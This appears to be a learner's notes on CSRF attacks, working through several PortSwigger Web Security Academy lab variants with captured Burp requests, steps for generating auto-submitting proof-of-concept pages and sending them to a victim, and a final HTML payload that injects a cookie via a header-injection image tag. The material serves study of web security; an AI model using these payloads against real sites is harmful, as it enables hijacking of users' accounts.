 ## CSRF(Cross-site request forgery)
   Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application
   in which they’re currently authenticated. With a little help of social engineering (such as sending a link via email or chat), 
   an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, 
   a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. 
   If the victim is an administrative account, CSRF can compromise the entire web application.

   ## Resource 
   
     https://corneacristian.medium.com/top-25-csrf-bug-bounty-reports-ffb0b61afa55


  ## How to test for CSRF
   A good methodology to identify CSRF vulnerabilities would be to discover all the endpoints through which the application initiates and executes actions,   and apply tests for all three types of Cross-Site Request Forgery described above.



  ## CSRF type
  
  
  
  ## 1. Basic
    
  Find CSRF vulnerability
  
  Email change functionality is vulnerable to CSRF
  
  Burp intercept request and manualy review
    
 ## BURP request
 
    POST /my-account/change-email HTTP/1.1
    Host: 0a98002a031dc494c0bb490d002b0039.web-security-academy.net
    Cookie: session=Xi4wUL9QBc5WIvwtzoN7dwzzJdwtDVi5
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 22
    Origin: https://0a98002a031dc494c0bb490d002b0039.web-security-academy.net
    Referer: https://0a98002a031dc494c0bb490d002b0039.web-security-academy.net/my-account
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    email=asif%40khan.com
  
 Sand the Request in Repeter
 
 Sand the Request in Engagement tools
 
 Sand the request Engagement sub-tabe Generate CSRF POC 
 
 Open the Option tabe and select the INCLUDE auto-submit Script
 
 and click "Regenerate"
 
 copy html and sand the victom
 
 victam click the link 
 
 boom hack the id 
 
  ## 2. CSRF change request method
 
  Find CSRF vulnerability
  
  Email change functionality is vulnerable to CSRF
  
  Burp intercept request and manualy review
    
    POST /my-account/change-email HTTP/1.1
    Host: 0ad2000603304f22c01c4dd500860024.web-security-academy.net
    Cookie: session=ogvSLeaV2cZGd1WUAWSmqSVPMvOm4Q4C
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 59
    Origin: https://0ad2000603304f22c01c4dd500860024.web-security-academy.net
    Referer: https://0ad2000603304f22c01c4dd500860024.web-security-academy.net/my-account
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    email=asif%40khan.com&csrf=XYZJKeGiUSE0mD4LKrHufpsusLxqtIQa
    
 ## Change request method 
    
 Change Email Id 
  
 Sand the Request in Repeter
 
 Sand the Request in Engagement tools
 
 Sand the request Engagement sub-tabe Generate CSRF POC 
 
 Open the Option tabe and select the INCLUDE auto-submit Script
 
 and click "Regenerate"
 
 copy html and sand the victom
 
 victam click the link 
 
 boom hack the id 
    
    
 ## 3. Remove CSRF Token 
 
  Find CSRF vulnerability
  
  Email change functionality is vulnerable to CSRF
  
  Burp intercept request and manualy review
    
    
    POST /my-account/change-email HTTP/1.1
    Host: 0a47009a043a07eac09a218e000300a8.web-security-academy.net
    Cookie: session=VShOTSOiOO4zVZzz8bn9QOcI7dhmtYJj
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 59
    Origin: https://0a47009a043a07eac09a218e000300a8.web-security-academy.net
    Referer: https://0a47009a043a07eac09a218e000300a8.web-security-academy.net/my-account
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    email=asif%40khan.com&csrf=WETxOXISfGeVUKAPqcezagvb4x9HSaZn


 Remove CSRF Token 
 
 Sand Request to Server accept the request website is vulnerabilities 

    
    POST /my-account/change-email HTTP/1.1
    Host: 0a47009a043a07eac09a218e000300a8.web-security-academy.net
    Cookie: session=VShOTSOiOO4zVZzz8bn9QOcI7dhmtYJj
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 59
    Origin: https://0a47009a043a07eac09a218e000300a8.web-security-academy.net
    Referer: https://0a47009a043a07eac09a218e000300a8.web-security-academy.net/my-account
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    email=asif%40khan.com

  Change Email Id 
  
 Sand the Request in Repeter
 
 Sand the Request in Engagement tools
 
 Sand the request Engagement sub-tabe Generate CSRF POC 
 
 Open the Option tabe and select the INCLUDE auto-submit Script
 
 and click "Regenerate"
 
 copy html and sand the victom
 
 victam click the link 
 
 boom hack the id 

    
 ## 4. CSRF where token is not tied to user session
 
 
  Find CSRF vulnerability
  
  Email change functionality is vulnerable to CSRF
  
  Burp intercept request and manualy review
 
  You have two accounts on the application that you can use to help design your attack
  
  Observe that if you Change the CSRF token with the value from the other account, then the request is accepted, this is vulnerable
  
 ## Privilege account request
 
    POST /my-account/change-email HTTP/1.1
    Host: 0a0800450456c9a9c0431ce40073003c.web-security-academy.net
    Cookie: session=s9t9wxedbIp1ub1eCsb6uXTps09RV5l3
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 62
    Origin: https://0a0800450456c9a9c0431ce40073003c.web-security-academy.net
    Dnt: 1
    Referer: https://0a0800450456c9a9c0431ce40073003c.web-security-academy.net/my-account
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    email=nasir%40gmail.com&csrf=HqtjvqoKSCdRw8vNjNE9jliF8P39WhM2
 
  ## Local User account request 
 
 
    POST /my-account/change-email HTTP/1.1
    Host: 0a0800450456c9a9c0431ce40073003c.web-security-academy.net
    Cookie: session=s9t9wxedbIp1ub1eCsb6uXTps09RV5l3
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 60
    Origin: https://0a0800450456c9a9c0431ce40073003c.web-security-academy.net
    Dnt: 1
    Referer: https://0a0800450456c9a9c0431ce40073003c.web-security-academy.net/my-account
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
 
    email=asif%40gmail.com&csrf=Oi7rHvtd7DOqsEEGicPXo4LBMidJEYcD
 
 
  Copy the csrf token Privilege account, and past the normal use csrf token, sand the to request server, Server is accept the request, This is vulnerable
  
 
 
 
  ## 5 CSRF where token is tied to non-session cookie
  
  Find CSRF vulnerability
  
  Email change functionality is vulnerable to CSRF
  
  Burp intercept request and manualy review
 
  You have two accounts on the application that you can use to help design your attack
 
 Observe that if you Change  the csrfKey cookie and csrf parameter from the first account to the second account, the request is accepted. 
 
 THIS IS VULNERABLE
 
 ## Privilege account request
 
    POST /my-account/change-email HTTP/1.1
    Host: 0a46002a0304dbd3c03a186b00050036.web-security-academy.net
    Cookie: session=ABcCuqstyngyux2QNIm9mq260r2zi58z; csrfKey=mVCTxe6SETdHTB59NX7izfWGmQbCJtGt
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 60
    Origin: https://0a46002a0304dbd3c03a186b00050036.web-security-academy.net
    Dnt: 1
    Referer: https://0a46002a0304dbd3c03a186b00050036.web-security-academy.net/my-account
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    email=nasir%40khan.com&csrf=G0zc7n3MlHSGvkIl3ji5OrCz4MEZQtKv
 
   ## Local User account request
 
    POST /my-account/change-email HTTP/1.1
    Host: 0a46002a0304dbd3c03a186b00050036.web-security-academy.net
    Cookie: session=24dpnS4N8crVqQHBTd3QBccYllRZheOe; csrfKey=mVCTxe6SETdHTB59NX7izfWGmQbCJtGt
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 59
    Origin: https://0a46002a0304dbd3c03a186b00050036.web-security-academy.net
    Referer: https://0a46002a0304dbd3c03a186b00050036.web-security-academy.net/my-account?id=wiener
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close

    email=asif%40khan.com&csrf=G0zc7n3MlHSGvkIl3ji5OrCz4MEZQtKv
 
 
 Copy the csrfKey and csrf token Privilege account, and past the local use csrfKey and csrf token, sand the to request server, Server is accept the request,
 This is vulnerable
 
 
 ## PAYLODS 
 
        <html>
     <!-- CSRF PoC - generated by Burp Suite Professional -->
     <body>
     <script>history.pushState('', '', '/')</script>
        <form action="https://0a46002a0304dbd3c03a186b00050036.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="asif&#64;khan&#46;com" />
        <input type="hidden" name="csrf" value="G0zc7n3MlHSGvkIl3ji5OrCz4MEZQtKv" />
        <input type="submit" value="Submit request" />
     </form>
    <img src="https://0a46002a0304dbd3c03a186b00050036.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=mVCTxe6SETdHTB59NX7izfWGmQbCJtGt"     onerror="document.forms[0].submit()">
    </body>
   </html>

 
 
 
 
 
    
